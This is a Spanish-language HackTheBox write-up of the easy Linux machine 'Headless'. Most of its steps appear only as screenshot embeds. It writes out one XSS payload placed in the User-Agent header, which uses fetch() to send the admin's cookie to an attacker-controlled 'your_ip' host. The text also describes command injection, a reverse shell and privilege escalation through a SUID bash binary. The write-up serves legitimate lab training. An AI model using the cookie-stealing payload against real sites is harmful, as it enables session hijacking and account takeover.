--- 
title: "Headless" 
platform: "Hackthebox"
date: "2026-02-27" 
difficulty: "Easy" 
os: "linux" 
description: "Resolución de la máquina Analysis de HackTheBox." 
---
#linux #easy 

-----------
Lo primero que hacemos es un escaneo de la maquina como siempre:
![[Pasted image 20240325102735.png]]
![[Pasted image 20240325102754.png]]
Vemos el launchpad para ver la versión que corre por detrás gracias al banner que nos devuelve el servicio ssh:
![[Pasted image 20240325102927.png]]
Vamos a ir a explorar la web que parece que corre por el puerto 5000:
![[Pasted image 20240325103755.png]]
>Esto es lo único que vemos en la web por lo que vamos a interceptar la petición con burpsuite para probar posibles inyecciones a XSS.
![[Pasted image 20240325104133.png]]

Con dirsearch buscamos posibles rutas:
![[Pasted image 20240325103924.png]]
Nos encuentra dashboard pero no tenemos permisos para acceder al recurso:
![[Pasted image 20240325104005.png]]
Hemos encontrado un xss en el user-agent:
```bash
	<img src=x onerror=fetch('[http://your_ip/?c='+document.cookie);>](http://your_ip/?c=%27+document.cookie);%3E "http://your_ip/?c='+document.cookie);>")
```

Lo urlencodeamos para enviarlo:
![[Pasted image 20240325105834.png]]
Si nos ponemos a la escucha por el puerto 80 de nuestra maquina kali nos llegara la cookie del admin:
![[Pasted image 20240325105926.png]]
Con la cookie del admin podemos acceder al recurso dashboard:
![[Pasted image 20240325110104.png]]Vamos a interceptar la petición de este recurso ahora:
![[Pasted image 20240325110218.png]]
Vamos a ver si es posible inyectar comandos en el parámetro date.
Enviamos la siguiente peticion con curl mientras estamos en esucha:
![[Pasted image 20240325110914.png]]
Y recibimos la petición:
![[Pasted image 20240325110941.png]]Vamos a crearnos un archivo que nos mande una reverse shell a la maquina para que el servidor acceda a este recurso y nos mande una shell:
![[Pasted image 20240325112359.png]]Nos ponemos en escucha ahora por el puerto 4444, y nos va a mandar una reverse shell desde el server victima cuando este acceda al recurso que nos acabamos de crear:
![[Pasted image 20240325112554.png]]
![[Pasted image 20240325112530.png]]
![[Pasted image 20240325114418.png]]
![[Pasted image 20240325112629.png]]
>Como vemos en la ultima cap el usuario al que nos conectamos puede ejecutar esa herramienta con privilegios de administrador, por lo que vamos a intentar explotarlo.

Vemos el script llamado syscheck:
![[Pasted image 20240325112948.png]]
Vemos que se arranca después de ejecutar el script un archivo llamado initdb.sh por lo que vamos a añadirle a dicho script un comando que nos de permisos SUID al binario de bash, así que cuando se ejecute el script initdb.sh se le dará este permiso al binario de bash y podremos hacernos root:
![[Pasted image 20240325114951.png]]
![[Pasted image 20240325115022.png]]

![[Pasted image 20240325114858.png]]